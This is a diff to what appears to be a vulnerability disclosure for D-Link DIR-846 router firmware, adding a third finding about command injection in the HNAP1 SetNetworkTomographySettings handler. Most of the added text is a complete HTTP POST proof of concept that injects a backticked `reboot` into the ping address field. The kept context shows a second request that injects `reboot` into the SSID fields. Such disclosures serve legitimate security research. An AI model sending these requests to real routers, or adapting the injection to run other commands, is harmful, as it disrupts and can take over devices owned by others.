@@ -79,8 +79,49 @@ Cookie: uid=fN5PwZCT; PrivateKey=B2488589E39C47E4F8349060E88008DE; PHPSESSID=620
 {"SetWizardConfig":{"wl(1).(0)_ssid":"`reboot`","wl(0).(0)_ssid":"aa\nreboot\n"}}
 ```
 
-
-
 #### TEXT
 
 <img src="./img/image-20211226105603738.png" alt="image-20211226105603738" style="zoom:50%;" />
+
+## Vulnerability3
+
+#### Describe
+
+There is command injection in HNAP1/control/SetNetworkTomographySettings.php of D-Link Router DIR-846 DIR846A1_FW100A43.bin && DIR846enFW100A53DLA-Retail.bin, and backticks can be used for command injection when judging whether it is a reasonable domain name.
+
+#### Detail
+
+The following domain names can be constructed for command injection
+
+```
+www.baidu.com/'`reboot`'
+```
+
+<img src="./img/image-20211222113830764.png" alt="image-20211222113830764" style="zoom:50%;" />
+
+#### POC
+
+```
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
+HNAP_AUTH: B573700726C0DE33335368EFA98967D4 1640426452615
+Content-Length: 199
+Origin: http://192.168.0.1
+Connection: close
+Referer: http://192.168.0.1/Diagnosis.html?t=1640426411756
+Cookie: uid=yo1BBSdJ; PrivateKey=F307B0A38DD86259C01188B535369C5A; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=4
+
+{"SetNetworkTomographySettings":{"tomography_ping_address":"www.baidu.com/'`reboot`'","tomography_ping_number":"22","tomography_ping_size":"40","tomography_ping_timeout":"","tomography_ping_ttl":""}}
+```
+
+#### TEXT
+
+​	The router sending the packet will restart
+
+<img src="./img/image-20211226103503414.png" alt="image-20211226103503414" style="zoom:50%;" />
